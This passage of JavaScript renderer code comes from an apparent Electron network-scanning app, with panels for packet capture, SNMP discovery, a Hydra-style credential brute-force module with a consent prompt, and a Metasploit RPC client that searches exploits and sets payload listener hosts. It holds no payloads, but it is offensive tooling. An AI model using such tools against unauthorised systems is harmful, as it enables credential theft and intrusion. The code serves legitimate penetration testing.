    spanProto.className = 'badge ' + (summary.protocol === 'TCP' ? 'info' : (summary.protocol === 'UDP' ? 'success' : 'warning'));
    spanProto.textContent = summary.protocol;
    tdProto.appendChild(spanProto);
    
    const tdLen = document.createElement('td');
    tdLen.textContent = summary.length;
    
    const tdInfo = document.createElement('td');
    tdInfo.className = 'selectable-text text-ellipsis';
    tdInfo.title = summary.info;
    tdInfo.textContent = summary.info;
    
    tr.appendChild(tdTime);
    tr.appendChild(tdSrc);
    tr.appendChild(tdDst);
    tr.appendChild(tdProto);
    tr.appendChild(tdLen);
    tr.appendChild(tdInfo);
    
    if (livePcapResults.children[0] && livePcapResults.children[0].textContent.includes('Waiting for')) {
      livePcapResults.innerHTML = '';
    } else if (livePcapResults.children[0] && livePcapResults.children[0].textContent.includes('Capturing packets...')) {
      livePcapResults.innerHTML = '';
    }
    
    livePcapResults.prepend(tr);
    if (livePcapResults.children.length > 500) {
      livePcapResults.lastElementChild.remove();
    }
  });

  window.electronAPI.onPcapStatsUpdate && window.electronAPI.onPcapStatsUpdate((stats) => {
    const livePcapStats = document.getElementById('live-pcap-total-stats');
    const livePcapWarnings = document.getElementById('live-pcap-warnings');
    if (livePcapStats) {
      livePcapStats.textContent = `${stats.totalPackets} Packets / ${stats.totalBytes} Bytes`;
    }
    if (livePcapWarnings) {
      livePcapWarnings.textContent = stats.warnings.join(', ');
    }
  });

  window.electronAPI.onPcapCaptureComplete && window.electronAPI.onPcapCaptureComplete((msg) => {
    const btnStartLivePcap = document.getElementById('btn-start-live-pcap');
    const btnStopLivePcap = document.getElementById('btn-stop-live-pcap');
    if (btnStartLivePcap) btnStartLivePcap.disabled = false;
    if (btnStopLivePcap) btnStopLivePcap.disabled = true;
    
    const livePcapWarnings = document.getElementById('live-pcap-warnings');
    if (livePcapWarnings && msg !== 'Capture finished.') {
      livePcapWarnings.textContent = msg;
    }
  });
}

// --- Passive Panel Integration (Outside electronAPI block for dom events) ---
function initPassivePanel() {
  const btnTogglePassivePanel = document.getElementById('btn-toggle-passive-panel');
  const passivePanel = document.getElementById('passive-panel');
  const btnClosePassivePanel = document.getElementById('btn-close-passive-panel');
  const btnRefreshPassiveInterfaces = document.getElementById('btn-refresh-passive-interfaces');

  async function refreshPassiveInterfaces() {
    btnRefreshPassiveInterfaces.disabled = true;
    passiveInterfaceSelect.innerHTML = '<option value="">Loading...</option>';
    try {
      const interfaces = await api.getInterfaces();
      passiveInterfaceSelect.innerHTML = '<option value="">Select Interface...</option>';
      interfaces.forEach(iface => {
        const opt = document.createElement('option');
        opt.value = iface.name; // In this modal it used iface.name as value already
        opt.dataset.name = iface.name; 
        opt.textContent = `${iface.name} (${iface.ip})`;
        passiveInterfaceSelect.appendChild(opt);
      });
    } catch (e) {
      console.error(e);
      passiveInterfaceSelect.innerHTML = '<option value="">Error Loading</option>';
    } finally {
      btnRefreshPassiveInterfaces.disabled = false;
    }
  }

  btnTogglePassivePanel?.addEventListener('click', async () => {
    if (passivePanel.style.display === 'none' || !passivePanel.classList.contains('open')) {
      const resizer = document.getElementById('passive-resizer');
      openPanel(passivePanel, resizer);
      await refreshPassiveInterfaces();
    } else {
      const resizer = document.getElementById('passive-resizer');
      closePanel(passivePanel, resizer);
    }
  });

  btnClosePassivePanel?.addEventListener('click', () => {
    const resizer = document.getElementById('passive-resizer');
    closePanel(passivePanel, resizer);
  });

  btnRefreshPassiveInterfaces?.addEventListener('click', refreshPassiveInterfaces);

  // PCAP Modal Integration
  const pcapModalOverlay = document.getElementById('pcap-modal-overlay');
  const btnClosePcapModal = document.getElementById('btn-close-pcap-modal');
  const btnCancelPcap = document.getElementById('btn-cancel-pcap');
  const btnStartPcapBtn = document.getElementById('btn-start-pcap');
  const pcapInterfaceSelect = document.getElementById('pcap-interface');
  const pcapHostIpInput = document.getElementById('pcap-host-ip');
  const pcapDurationInput = document.getElementById('pcap-duration');
  const btnExportPcap = document.getElementById('btn-export-pcap');

  btnExportPcap?.addEventListener('click', async () => {
    pcapModalOverlay.classList.remove('hidden');
    pcapInterfaceSelect.innerHTML = '<option value="">Loading...</option>';
    try {
      const interfaces = await api.getInterfaces();
      pcapInterfaceSelect.innerHTML = '';
      interfaces.forEach(iface => {
        const opt = document.createElement('option');
        opt.value = iface.name; 
        opt.textContent = `${iface.name} (${iface.ip})`;
        pcapInterfaceSelect.appendChild(opt);
      });
      if (passiveInterfaceSelect.value) {
        pcapInterfaceSelect.value = passiveInterfaceSelect.value;
      }
    } catch (e) {
      console.error(e);
      pcapInterfaceSelect.innerHTML = '<option value="">Error Loading</option>';
    }
  });

  const closePcapModal = () => pcapModalOverlay.classList.add('hidden');
  btnClosePcapModal?.addEventListener('click', closePcapModal);
  btnCancelPcap?.addEventListener('click', closePcapModal);

  btnStartPcapBtn?.addEventListener('click', async () => {
    const iface = pcapInterfaceSelect.value;
    if (!iface) {
      alert('Select an interface');
      return;
    }
    
    const host = pcapHostIpInput.value.trim();
    const dur = parseInt(pcapDurationInput.value, 10) || 60;
    
    btnStartPcapBtn.disabled = true;
    btnStartPcapBtn.textContent = 'Starting...';
    
    const res = await api.exportPcap({ interfaceId: iface, hostIp: host, duration: dur });
    if (res.success && res.status === 'started') {
      btnStartPcapBtn.textContent = 'Exporting...';
      closePcapModal();
      btnStartPcapBtn.disabled = false;
      btnStartPcapBtn.textContent = 'Start Export';
    } else {
      btnStartPcapBtn.disabled = false;
      btnStartPcapBtn.textContent = 'Start Export';
      if (res.status !== 'cancelled') {
         alert(`Failed to start PCAP export: ${res.error}`);
      } else {
         closePcapModal();
      }
    }
  });
}

initPassivePanel();

// --- SNMP UI Helpers ---
let cachedSnmpBlacklist = [];

async function refreshSnmpBlacklist() {
  const blacklistStr = await window.electronAPI.settings.get('blacklist');
  cachedSnmpBlacklist = blacklistStr ? blacklistStr.split(',').map(s=>s.trim()) : [];
}

function addDiscoveredHost({ ip, mac, source }) {
  // Re-check for existing host to avoid race duplicates
  const existingIdx = state.hosts.findIndex(h => h.ip === ip);
  if (existingIdx !== -1) {
     // If the host exists but lacks a MAC address, silently enrich it
     if (state.hosts[existingIdx].mac === 'Unknown' && mac) {
        state.hosts[existingIdx].mac = mac;
        console.log(`[SNMP Intel] Enriched existing host MAC via ARP: ${ip}`);
        debouncedRenderAllHosts();
     }
     return;
  }

  // Blacklist check (using cached list for performance)
  if (cachedSnmpBlacklist.includes(ip) || ip === '127.0.0.1' || ip === '0.0.0.0') {
    return;
  }

  state.hosts.push({
    ip,
    mac: mac || 'Unknown',
    hostname: 'Unknown',
    vendor: 'Unknown',
    os: 'Unknown',
    status: 'online',
    ports: [],
    vulnerabilities: [],
    routing: [],
    processes: [],
    source: source || 'snmp-arp'
  });
  console.log(`[SNMP Intel] Auto-discovered new host via ARP: ${ip}`);
  debouncedRenderAllHosts();
}

function renderIntelligenceBadge(containerId, value, type) {
  const container = document.getElementById(containerId);
  if (!container) return;

  const sectionId = containerId.replace('-container', '-section');
  const section = document.getElementById(sectionId);
  if (section) section.style.display = 'block';

  const sp = document.createElement('span');
  sp.className = 'port-item';
  if (type === 'route') {
    sp.style.background = 'var(--info)';
    sp.style.color = '#fff';
  } else {
    sp.style.background = 'rgba(255,255,255,0.1)';
    sp.style.border = '1px solid var(--border-glass)';
  }
  sp.textContent = value;
  container.appendChild(sp);
}

function updateHostIntelligence(ip, intel) {
  const hostIdx = state.hosts.findIndex(h => h.ip === ip);
  if (hostIdx === -1) return;

  let changed = false;
  const host = state.hosts[hostIdx];

  // Map incoming intelligence types to state update logic
  if (intel.type === 'os' && intel.value && host.os !== intel.value) {
    host.os = intel.value;
    changed = true;
  } else if (intel.type === 'hostname' && intel.value && host.hostname !== intel.value) {
    host.hostname = intel.value;
    changed = true;
  } else if (intel.type === 'vendor' && intel.value && host.vendor !== intel.value) {
    host.vendor = intel.value;
    changed = true;
  } else if (intel.type === 'process-discovery' && intel.processName) {
    if (!host.processes) host.processes = [];
    if (!host.processes.includes(intel.processName)) {
      host.processes.push(intel.processName);
      changed = true;
    }
  } else if (intel.type === 'route-discovery' && intel.routeIp) {
    if (!host.routing) host.routing = [];
    if (!host.routing.includes(intel.routeIp)) {
      host.routing.push(intel.routeIp);
      changed = true;
    }
  }

  if (changed) {
    debouncedRenderAllHosts();
    
    // Live update open panel if it matches the current host
    const btnRunDeepScan = document.getElementById('btn-run-deep-scan');
    if (btnRunDeepScan && btnRunDeepScan.getAttribute('data-ip') === ip) {
      if (intel.type === 'os') {
        const el = document.getElementById('dp-os');
        if (el) el.innerText = intel.value;
      } else if (intel.type === 'hostname') {
        const el = document.getElementById('dp-hostname');
        if (el) el.innerText = intel.value;
      } else if (intel.type === 'process-discovery') {
        renderIntelligenceBadge('dp-processes-container', intel.processName, 'process');
      } else if (intel.type === 'route-discovery') {
        renderIntelligenceBadge('dp-routing-container', intel.routeIp, 'route');
      }
    }
  }
}

// --- Global SNMP Listeners ---
window.electronAPI.onSnmpIntel && window.electronAPI.onSnmpIntel((intel) => {
  if (intel.type === 'arp-discovery' && intel.discoveredIp) {
    addDiscoveredHost({ ip: intel.discoveredIp, mac: intel.discoveredMac });
  } else {
    updateHostIntelligence(intel.targetIp, intel);
  }
});

window.electronAPI.onSnmpWalkProgress && window.electronAPI.onSnmpWalkProgress((progress) => {
  const pCount = document.getElementById('snmp-progress-count');
  if (pCount) pCount.textContent = `${progress.count} OIDs`;
});

window.electronAPI.onSnmpWalkResult && window.electronAPI.onSnmpWalkResult((result) => {
  let dataLen = 0;
  if (window.currentSnmpWalkData) {
     dataLen = window.currentSnmpWalkData.push(result);
  }

  const container = document.getElementById('snmp-data-container');
  if (!container) return; // Panel not open or switched

  if (dataLen > 100) {
     if (dataLen === 101) {
        const msg = document.createElement('div');
        msg.style.cssText = 'text-align:center; padding: 16px; color: var(--warning); font-size: 13px; font-weight: 500; border-top: 1px solid var(--border-glass); margin-top: 8px; margin-bottom: 8px;';
        msg.innerHTML = '<span class="icon">⚠️</span> Showing first 100 results to prevent UI freezing.<br>Please click <b>Export CSV</b> above to analyze the full MIB tree dataset.';
        container.appendChild(msg);
     }
     return;
  }

  const el = document.createElement('div');
  el.className = 'ds-record';
  
  const header = document.createElement('div');
  header.className = 'ds-header';
  
  const title = document.createElement('div');
  title.className = 'ds-header-title';
  
  const portSpan = document.createElement('span');
  portSpan.className = 'ds-port';
  portSpan.textContent = result.name || result.oid;

  const typeMap = {
    2: 'Integer', 4: 'OctetString', 5: 'Null', 6: 'OID', 64: 'IpAddress', 65: 'Counter', 66: 'Gauge', 67: 'TimeTicks', 68: 'Opaque'
  };
  const typeStr = typeMap[result.type] || `Type ${result.type}`;

  const serviceSpan = document.createElement('span');
  serviceSpan.className = 'ds-service';
  serviceSpan.style.marginLeft = '8px';
  serviceSpan.style.opacity = '0.6';
  serviceSpan.style.fontSize = '0.85em';
  serviceSpan.textContent = typeStr;

  title.appendChild(portSpan);
  title.appendChild(serviceSpan);
  header.appendChild(title);
  
  const valDiv = document.createElement('div');
  valDiv.className = 'ds-details selectable-text';
  valDiv.style.fontFamily = 'monospace';
  valDiv.style.color = 'var(--text-main)';
  // Handle multiline strings gracefully
  valDiv.textContent = result.value;
  
  el.appendChild(header);
  el.appendChild(valDiv);
  container.appendChild(el);
});

window.electronAPI.onSnmpWalkComplete && window.electronAPI.onSnmpWalkComplete((hostIp) => {
  const btnRunSnmp = document.getElementById('btn-run-snmp');
  if (btnRunSnmp) {
    btnRunSnmp.innerHTML = `<span class="icon">📡</span> SNMP Walk`;
    btnRunSnmp.setAttribute('data-scanning', 'false');
    btnRunSnmp.classList.remove('pulsing', 'danger-pulsing');
    btnRunSnmp.classList.add('info');
  }

  const btnExportSnmp = document.getElementById('btn-export-snmp');
  if (btnExportSnmp && window.currentSnmpWalkData && window.currentSnmpWalkData.length > 0) {
     btnExportSnmp.style.display = 'block';
  }

  const pContainer = document.getElementById('snmp-progress-container');
  if (pContainer) pContainer.style.display = 'none';

  const dataContainer = document.getElementById('snmp-data-container');
  if (dataContainer && dataContainer.children.length === 0) {
    const el = document.createElement('div');
    el.style.textAlign = 'center';
    el.style.color = 'var(--text-muted)';
    el.style.fontSize = '12px';
    el.style.padding = '16px';
    el.textContent = 'Walk completed with no results or agent unreachable.';
    dataContainer.appendChild(el);
  }
});

window.electronAPI.onSnmpWalkError && window.electronAPI.onSnmpWalkError(({ hostIp, error }) => {
  const btnRunSnmp = document.getElementById('btn-run-snmp');
  if (btnRunSnmp) {
    btnRunSnmp.innerHTML = `<span class="icon">📡</span> SNMP Walk`;
    btnRunSnmp.setAttribute('data-scanning', 'false');
    btnRunSnmp.classList.remove('pulsing', 'danger-pulsing');
    btnRunSnmp.classList.add('info');
  }

  const btnExportSnmp = document.getElementById('btn-export-snmp');
  if (btnExportSnmp && window.currentSnmpWalkData && window.currentSnmpWalkData.length > 0) {
     btnExportSnmp.style.display = 'block';
  }

  const pContainer = document.getElementById('snmp-progress-container');
  if (pContainer) pContainer.style.display = 'none';

  const container = document.getElementById('snmp-data-container');
  if (!container) return;

  const el = document.createElement('div');
  el.className = 'ds-record';
  el.style.borderLeftColor = 'var(--danger)';
  
  const header = document.createElement('div');
  header.style.color = 'var(--danger)';
  header.style.fontSize = '12px';
  header.style.fontWeight = 'bold';
  header.textContent = 'SNMP Error';

  const body = document.createElement('div');
  body.style.color = 'var(--text-muted)';
  body.style.fontSize = '11px';
  body.style.marginTop = '4px';
  body.textContent = error;

  el.appendChild(header);
  el.appendChild(body);
  container.appendChild(el);
});

// =============================================
// === OFFENSIVE PENTEST: BRUTE-FORCE MODULE ===
// =============================================

let isBfRunning = false;
let bfAttemptCount = 0;
let pentestConsentAccepted = false;
let pendingBfConfig = null; // Holds {ip, port, protocol} while consent is pending

// --- Consent Flow ---
const pentestConsentOverlay = document.getElementById('pentest-consent-overlay');
const btnClosePentestConsent = document.getElementById('btn-close-pentest-consent');
const btnPentestConsentReject = document.getElementById('btn-pentest-consent-reject');
const btnPentestConsentAccept = document.getElementById('btn-pentest-consent-accept');

function closePentestConsent() {
  pentestConsentOverlay?.classList.add('hidden');
  pendingBfConfig = null;
}

btnClosePentestConsent?.addEventListener('click', closePentestConsent);
btnPentestConsentReject?.addEventListener('click', closePentestConsent);

btnPentestConsentAccept?.addEventListener('click', async () => {
  pentestConsentAccepted = true;
  // Persist consent
  await api.settings.set('pentestConsentAccepted', true);
  pentestConsentOverlay?.classList.add('hidden');
  if (pendingBfConfig) {
    const cfg = pendingBfConfig;
    pendingBfConfig = null;
    if (cfg._type === 'dirfuzz') {
      runDirFuzz();
    } else {
      showBruteForceModal(cfg.ip, cfg.port, cfg.protocol);
    }
  }
});

// Check persisted consent on load
api.settings.get('pentestConsentAccepted').then(val => {
  pentestConsentAccepted = !!val;
});

// --- Brute-Force Modal ---
const bfOverlay = document.getElementById('bruteforce-modal-overlay');
const btnCloseBfModal = document.getElementById('btn-close-bf-modal');
const bfTargetIp = document.getElementById('bf-target-ip');
const bfPort = document.getElementById('bf-port');
const bfProtocol = document.getElementById('bf-protocol');
const bfUsername = document.getElementById('bf-username');
const bfWordlistPath = document.getElementById('bf-wordlist-path');
const btnBfBrowseWordlist = document.getElementById('btn-bf-browse-wordlist');
const bfThreads = document.getElementById('bf-threads');
const bfThreadsVal = document.getElementById('bf-threads-val');
const bfDelay = document.getElementById('bf-delay');
const bfMaxAttempts = document.getElementById('bf-max-attempts');
const btnBfStart = document.getElementById('btn-bf-start');
const btnBfStop = document.getElementById('btn-bf-stop');
const bfProgressContainer = document.getElementById('bf-progress-container');
const bfProgressFill = document.getElementById('bf-progress-fill');
const bfProgressText = document.getElementById('bf-progress-text');
const bfResultsBody = document.getElementById('bf-results-body');
const bfErrorDisplay = document.getElementById('bf-error-display');

// Protocol → default port map
const protocolPortMap = {
  'ssh': 22, 'ftp': 21, 'smb': 445, 'rdp': 3389,
  'http-get': 80, 'http-post': 80, 'telnet': 23,
  'mysql': 3306, 'mssql': 1433, 'postgres': 5432, 'vnc': 5900
};

/**
 * Open the brute-force modal. Checks consent first.
 */
function openBruteForceModal(ip, port, protocol) {
  if (!pentestConsentAccepted) {
    pendingBfConfig = { ip, port, protocol };
    pentestConsentOverlay?.classList.remove('hidden');
    return;
  }
  showBruteForceModal(ip, port, protocol);
}

function showBruteForceModal(ip, port, protocol) {
  resetBfModal();
  if (bfTargetIp) bfTargetIp.value = ip || '';
  if (bfPort) bfPort.value = port || 22;
  if (bfProtocol) bfProtocol.value = protocol || 'ssh';
  bfOverlay?.classList.remove('hidden');
}

function closeBfModal() {
  bfOverlay?.classList.add('hidden');
}

function resetBfModal() {
  isBfRunning = false;
  bfAttemptCount = 0;
  if (btnBfStart) { btnBfStart.disabled = false; btnBfStart.classList.remove('pulsing'); }
  if (btnBfStop) btnBfStop.disabled = true;
  if (bfProgressContainer) bfProgressContainer.style.display = 'none';
  if (bfProgressFill) bfProgressFill.style.width = '0%';
  if (bfProgressText) bfProgressText.textContent = '0 attempts';
  if (bfResultsBody) bfResultsBody.innerHTML = '<tr><td colspan="4" style="text-align:center; color: var(--text-muted); padding: 16px;">Configure and start an attack above</td></tr>';
  if (bfErrorDisplay) { bfErrorDisplay.style.display = 'none'; bfErrorDisplay.textContent = ''; }
}

btnCloseBfModal?.addEventListener('click', closeBfModal);

// Thread slider live value update
bfThreads?.addEventListener('input', () => {
  if (bfThreadsVal) bfThreadsVal.textContent = bfThreads.value;
});

// Protocol → port auto-sync
bfProtocol?.addEventListener('change', () => {
  const defaultPort = protocolPortMap[bfProtocol.value];
  if (defaultPort && bfPort) bfPort.value = defaultPort;
});

// Password wordlist file picker (native OS dialog)
btnBfBrowseWordlist?.addEventListener('click', async () => {
  try {
    const result = await api.browseFile({
      title: 'Select Password Wordlist',
      filters: [
        { name: 'Text Files', extensions: ['txt', 'lst', 'dict'] },
        { name: 'All Files', extensions: ['*'] }
      ],
    });
    if (result.status === 'selected' && result.path) {
      if (bfWordlistPath) bfWordlistPath.value = result.path;
    }
  } catch (err) {
    showBfError(`Failed to open file dialog: ${err.message}`);
  }
});

// Start Attack
btnBfStart?.addEventListener('click', async () => {
  const targetIp = bfTargetIp?.value?.trim();
  const port = parseInt(bfPort?.value, 10);
  const protocol = bfProtocol?.value;
  const username = bfUsername?.value?.trim();
  const wordlistPath = bfWordlistPath?.value?.trim();
  const threads = parseInt(bfThreads?.value, 10) || 4;
  const delay = parseInt(bfDelay?.value, 10) || 0;
  const maxAttempts = parseInt(bfMaxAttempts?.value, 10) || 10000;

  // Client-side validation
  if (!targetIp) { showBfError('Target IP is required'); return; }
  if (!port || port < 1 || port > 65535) { showBfError('Invalid port (1-65535)'); return; }
  if (!username) { showBfError('Username is required'); return; }
  if (!wordlistPath) { showBfError('Wordlist path is required'); return; }

  hideBfError();
  bfAttemptCount = 0;
  isBfRunning = true;

  // Update UI state
  btnBfStart.disabled = true;
  btnBfStart.classList.add('pulsing');
  btnBfStop.disabled = false;
  bfProgressContainer.style.display = 'block';
  bfProgressFill.style.width = '0%';
  bfProgressText.textContent = 'Starting...';
  bfResultsBody.innerHTML = '';

  try {
    await api.startBruteForce({
      targetIp,
      port,
      protocol,
      username,
      wordlistPath,
      threads,
      delay,
      maxAttempts,
    });
  } catch (err) {
    showBfError(`Failed to start: ${err.message}`);
    resetBfState();
  }
});

// Stop Attack
btnBfStop?.addEventListener('click', async () => {
  try {
    await api.stopBruteForce();
  } catch (_) { /* ignore */ }
  resetBfState();
});

function resetBfState() {
  isBfRunning = false;
  if (btnBfStart) { btnBfStart.disabled = false; btnBfStart.classList.remove('pulsing'); }
  if (btnBfStop) btnBfStop.disabled = true;
}

function showBfError(msg) {
  if (bfErrorDisplay) {
    bfErrorDisplay.textContent = msg;
    bfErrorDisplay.style.display = 'block';
  }
}

function hideBfError() {
  if (bfErrorDisplay) {
    bfErrorDisplay.textContent = '';
    bfErrorDisplay.style.display = 'none';
  }
}

function formatBfTime(isoString) {
  try {
    const d = new Date(isoString);
    return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  } catch { return '--:--:--'; }
}

// --- Brute-Force IPC Event Listeners ---

window.electronAPI.onBruteForceAttempt((data) => {
  bfAttemptCount = data.attemptNumber || (bfAttemptCount + 1);
  if (bfProgressText) {
    bfProgressText.textContent = `${bfAttemptCount} attempts`;
  }
  // Only show every 10th attempt to avoid flooding the DOM
  if (bfAttemptCount % 10 === 0 || bfAttemptCount <= 5) {
    const row = document.createElement('tr');
    row.className = 'bf-attempt-row';
    row.innerHTML = `<td>${formatBfTime(data.timestamp)}</td><td colspan="2" style="font-family: monospace; font-size: 10px;">${escapeHtml(data.line?.substring(0, 80) || '...')}</td><td style="color: var(--text-muted);">⏳</td>`;
    bfResultsBody?.appendChild(row);
    // Auto-scroll
    const container = document.getElementById('bf-results-container');
    if (container) container.scrollTop = container.scrollHeight;
  }
});

window.electronAPI.onBruteForceResult((data) => {
  const row = document.createElement('tr');
  row.className = 'bf-credential-hit';
  row.innerHTML = `<td>${formatBfTime(data.timestamp)}</td><td><strong>${escapeHtml(data.user)}</strong></td><td><strong>${escapeHtml(data.password)}</strong> <span class="bf-copy-btn" title="Copy credential">📋</span></td><td style="color: var(--success);">✅</td>`;
  
  // Copy-to-clipboard on the copy button
  const copyBtn = row.querySelector('.bf-copy-btn');
  if (copyBtn) {
    copyBtn.addEventListener('click', () => {
      navigator.clipboard.writeText(`${data.user}:${data.password}`);
      copyBtn.textContent = '✔️';
      setTimeout(() => { copyBtn.textContent = '📋'; }, 2000);
    });
  }

  bfResultsBody?.prepend(row); // Show hits at top
});

window.electronAPI.onBruteForceProgress((data) => {
  if (bfProgressText) {
    bfProgressText.textContent = `${data.attemptCount || bfAttemptCount} attempts | ${data.foundCount || 0} found | ${data.statusText || ''}`;
  }
  // Estimate progress (rough — based on attempt count vs max)
  const max = parseInt(bfMaxAttempts?.value, 10) || 10000;
  const pct = Math.min(((data.attemptCount || bfAttemptCount) / max) * 100, 100);
  if (bfProgressFill) bfProgressFill.style.width = `${pct}%`;
});

window.electronAPI.onBruteForceError((data) => {
  showBfError(data.message || 'Unknown brute-force error');
});

window.electronAPI.onBruteForceComplete((data) => {
  resetBfState();
  if (bfProgressFill) bfProgressFill.style.width = '100%';
  
  const found = data.credentialsFound?.length || 0;
  const summary = `Complete — ${data.totalAttempts || 0} attempts, ${found} credential${found !== 1 ? 's' : ''} found (exit code ${data.exitCode})`;
  if (bfProgressText) bfProgressText.textContent = summary;

  if (data.stderr && data.exitCode !== 0) {
    showBfError(`Hydra stderr: ${data.stderr.substring(0, 200)}`);
  }
});

// =============================================
// === METASPLOIT RPC UI MODULE ===
// =============================================

const msfModalOverlay = document.getElementById('msf-modal-overlay');
const btnCloseMsfModal = document.getElementById('btn-close-msf-modal');
const msfStatusDot = document.getElementById('msf-status-dot');
const msfStatusLabel = document.getElementById('msf-status-label');
const msfHostLabel = document.getElementById('msf-host-label');
const msfHost = document.getElementById('msf-host');
const msfPort = document.getElementById('msf-port');
const msfUsername = document.getElementById('msf-username');
const msfPassword = document.getElementById('msf-password');
const msfSsl = document.getElementById('msf-ssl');
const btnMsfConnect = document.getElementById('btn-msf-connect');
const btnMsfDisconnect = document.getElementById('btn-msf-disconnect');
const msfRemoteWarning = document.getElementById('msf-remote-warning');
const msfConnectForm = document.getElementById('msf-connect-form');
const msfExploitSearch = document.getElementById('msf-exploit-search');
const btnMsfSearch = document.getElementById('btn-msf-search');
const msfExploitTbody = document.getElementById('msf-exploit-tbody');
const msfSessionsContainer = document.getElementById('msf-sessions-container');
const btnMsfRefreshSessions = document.getElementById('btn-msf-refresh-sessions');
const msfErrorDisplay = document.getElementById('msf-error-display');

// Run Exploit Modal
const msfRunModalOverlay = document.getElementById('msf-run-modal-overlay');
const btnCloseMsfRunModal = document.getElementById('btn-close-msf-run-modal');
const msfRunModule = document.getElementById('msf-run-module');
const msfRunTargetIp = document.getElementById('msf-run-target-ip');
const msfRunTargetPort = document.getElementById('msf-run-target-port');
const msfRunPayload = document.getElementById('msf-run-payload');
const msfRunLhost = document.getElementById('msf-run-lhost');
const msfRunLport = document.getElementById('msf-run-lport');
const btnMsfRunExecute = document.getElementById('btn-msf-run-execute');
const btnMsfRunCancel = document.getElementById('btn-msf-run-cancel');

let msfConnected = false;

// --- MSF Helper Functions ---

function showMsfError(msg) {
  if (!msfErrorDisplay) return;
  msfErrorDisplay.textContent = msg;
  msfErrorDisplay.style.display = 'block';
  setTimeout(() => { msfErrorDisplay.style.display = 'none'; }, 8000);
}

function clearMsfError() {
  if (msfErrorDisplay) msfErrorDisplay.style.display = 'none';
}

function updateMsfStatusUI(statusState, label) {
  if (msfStatusDot) {
    msfStatusDot.className = `msf-status-dot ${statusState}`;
  }
  if (msfStatusLabel) {
    msfStatusLabel.textContent = label || statusState.charAt(0).toUpperCase() + statusState.slice(1);
  }
}

function setMsfConnectedState(connected, host, port) {
  msfConnected = connected;
  if (connected) {
    updateMsfStatusUI('connected', 'Connected');
    if (msfHostLabel) msfHostLabel.textContent = `${host}:${port}`;
    if (btnMsfConnect) btnMsfConnect.style.display = 'none';
    if (btnMsfDisconnect) btnMsfDisconnect.style.display = '';
    // Enable search and sessions
    if (msfExploitSearch) msfExploitSearch.disabled = false;
    if (btnMsfSearch) btnMsfSearch.disabled = false;
    if (btnMsfRefreshSessions) btnMsfRefreshSessions.disabled = false;
    // Disable form inputs
    [msfHost, msfPort, msfUsername, msfPassword, msfSsl].forEach(el => {
      if (el) el.disabled = true;
    });
  } else {
    updateMsfStatusUI('disconnected', 'Disconnected');
    if (msfHostLabel) msfHostLabel.textContent = '';
    if (btnMsfConnect) btnMsfConnect.style.display = '';
    if (btnMsfDisconnect) btnMsfDisconnect.style.display = 'none';
    // Disable search and sessions
    if (msfExploitSearch) msfExploitSearch.disabled = true;
    if (btnMsfSearch) btnMsfSearch.disabled = true;
    if (btnMsfRefreshSessions) btnMsfRefreshSessions.disabled = true;
    // Enable form inputs
    [msfHost, msfPort, msfUsername, msfPassword, msfSsl].forEach(el => {
      if (el) el.disabled = false;
    });
  }
}

// --- MSF Modal Open/Close ---

function openMsfModal() {
  clearMsfError();
  msfModalOverlay?.classList.remove('hidden');
}

function closeMsfModal() {
  msfModalOverlay?.classList.add('hidden');
}

btnCloseMsfModal?.addEventListener('click', closeMsfModal);
msfModalOverlay?.addEventListener('click', (e) => {
  if (e.target === msfModalOverlay) closeMsfModal();
});

// --- MSF Tab Switching ---
document.querySelectorAll('[data-msf-tab]').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('[data-msf-tab]').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.msf-tab-pane').forEach(p => p.style.display = 'none');
    tab.classList.add('active');
    const pane = document.getElementById(`msf-tab-${tab.getAttribute('data-msf-tab')}`);
    if (pane) pane.style.display = 'block';
  });
});

// --- Non-localhost Warning ---
msfHost?.addEventListener('input', () => {
  const val = (msfHost.value || '').trim();
  const isLocal = val === '127.0.0.1' || val === 'localhost' || val === '::1' || val === '';
  if (msfRemoteWarning) msfRemoteWarning.style.display = isLocal ? 'none' : 'block';
});

// --- Connect ---
btnMsfConnect?.addEventListener('click', async () => {
  clearMsfError();
  const host = (msfHost?.value || '127.0.0.1').trim();
  const port = parseInt(msfPort?.value || '55553', 10);
  const username = (msfUsername?.value || 'msf').trim();
  const password = msfPassword?.value || '';
  const ssl = msfSsl?.checked || false;

  if (!password) {
    showMsfError('Password is required');
    msfPassword?.focus();
    return;
  }

  updateMsfStatusUI('connecting', 'Connecting...');
  btnMsfConnect.disabled = true;

  try {
    const result = await api.msfConnect({ host, port, username, password, ssl });
    if (result.status === 'error') {
      updateMsfStatusUI('error', 'Connection Failed');
      showMsfError(result.error || 'Failed to connect');
      btnMsfConnect.disabled = false;
    } else {
      setMsfConnectedState(true, host, port);
      if (result.warning) showMsfError(result.warning);
      // Auto-refresh sessions
      refreshMsfSessions();
    }
  } catch (err) {
    updateMsfStatusUI('error', 'Connection Failed');
    showMsfError(err.message || 'Failed to connect');
    btnMsfConnect.disabled = false;
  }
});

// --- Disconnect ---
btnMsfDisconnect?.addEventListener('click', async () => {
  clearMsfError();
  try {
    await api.msfDisconnect();
  } catch (_) { /* ignore */ }
  setMsfConnectedState(false);
  btnMsfConnect.disabled = false;
  msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">Connect to msfrpcd and search for exploits</td></tr>';
  msfSessionsContainer.innerHTML = '<div class="ds-record" style="text-align:center; color: var(--text-muted); opacity: 0.7; padding: 24px;">No active sessions</div>';
});

// --- Exploit Search ---
let msfSearchTimeout = null;

async function searchMsfExploits() {
  const query = (msfExploitSearch?.value || '').trim();
  if (!query) return;
  if (!msfConnected) {
    showMsfError('Not connected to Metasploit RPC');
    return;
  }

  clearMsfError();
  msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">Searching...</td></tr>';

  try {
    const result = await api.msfListExploits(query);
    if (result.status === 'error') {
      showMsfError(result.error);
      msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--danger); padding: 24px;">Search failed</td></tr>';
      return;
    }

    const exploits = result.exploits || [];
    if (exploits.length === 0) {
      msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">No results found</td></tr>';
      return;
    }

    msfExploitTbody.innerHTML = '';
    exploits.slice(0, 100).forEach(mod => {
      const row = document.createElement('tr');
      const rankClass = (mod.rank || 'normal').toLowerCase();
      row.innerHTML = `
